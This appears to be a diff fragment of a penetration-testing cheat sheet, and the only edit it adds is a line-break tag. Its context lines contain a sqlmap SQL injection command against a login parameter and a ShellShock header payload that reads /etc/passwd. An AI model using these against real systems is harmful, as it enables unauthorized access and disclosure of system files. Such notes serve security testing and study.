@@ -44,6 +44,7 @@ sqlmap -r sqlmap_request2 -p txtLoginID
 ## PHP CGI-Bin Exploits
 
 **Exploiting ShellShock via CGI-Bin**
+<br/>
 ![Shell Shock via User-Agent Header](./img/SHELL_SHOCK.png)
 ```
 () { :;}; echo $(</etc/passwd)
